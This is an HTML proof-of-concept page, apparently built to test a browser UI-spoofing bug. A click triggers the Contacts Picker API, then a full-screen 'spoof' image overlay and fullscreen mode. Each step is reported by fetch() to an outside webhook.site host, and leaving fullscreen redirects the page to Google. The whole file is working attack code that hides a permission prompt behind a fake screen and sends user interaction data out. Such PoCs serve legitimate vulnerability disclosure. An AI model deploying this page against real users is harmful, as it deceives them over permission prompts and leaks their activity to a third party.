<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webhook POC</title>
  <style>
    html, body {
      margin: 0; padding: 0;
      width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      background: #000; color: #fff; font-family: sans-serif;
    }
    #spoof {
      position: fixed; inset: 0;
      width: 100%; height: 100%;
      object-fit: cover; display: none;
      pointer-events: none; z-index: 9999;
    }
  </style>
</head>
<body>

<img id="spoof" src="spof2.png" alt="spoof">
<h1>Click anywhere to start</h1>

<script>
const WEBHOOK_URL = "https://webhook.site/c28e63ae-558e-47e6-84d1-3ca7c07cacc4";

/* Helper: send log to webhook */
function sendLog(type, data = {}) {
  const payload = {
    time: new Date().toISOString(),
    type,
    ...data
  };
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(console.error);
}

/* Click handler */
document.addEventListener('click', async () => {

  /* Contacts picker */
  if (navigator.contacts && navigator.contacts.select) {
    sendLog('contacts_picker_called');

    navigator.contacts.select(["name"], {})
      .then(result => {
        sendLog('contacts_picker_closed', { granted: true, count: result.length });
      })
      .catch(err => {
        sendLog('contacts_picker_closed', { granted: false, reason: err.name });
      });
  } else {
    sendLog('contacts_api_not_supported');
  }

  /* Show spoof overlay */
  document.getElementById('spoof').style.display = 'block';
  document.querySelector('h1').style.display = 'none';
  sendLog('spoof_shown');

  /* Enter fullscreen */
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
      sendLog('entered_fullscreen');
    } catch (e) {
      sendLog('fullscreen_failed', { error: e.message });
    }
  }

}, { once: true });

/* Detect exit fullscreen â†’ redirect */
document.addEventListener('fullscreenchange', () => {
  if (!document.fullscreenElement) {
    sendLog('exit_fullscreen_detected');
    setTimeout(() => {
      sendLog('redirect_to_google');
      location.href = 'https://google.com';
    }, 1200);
  }
});
</script>

</body>
</html>
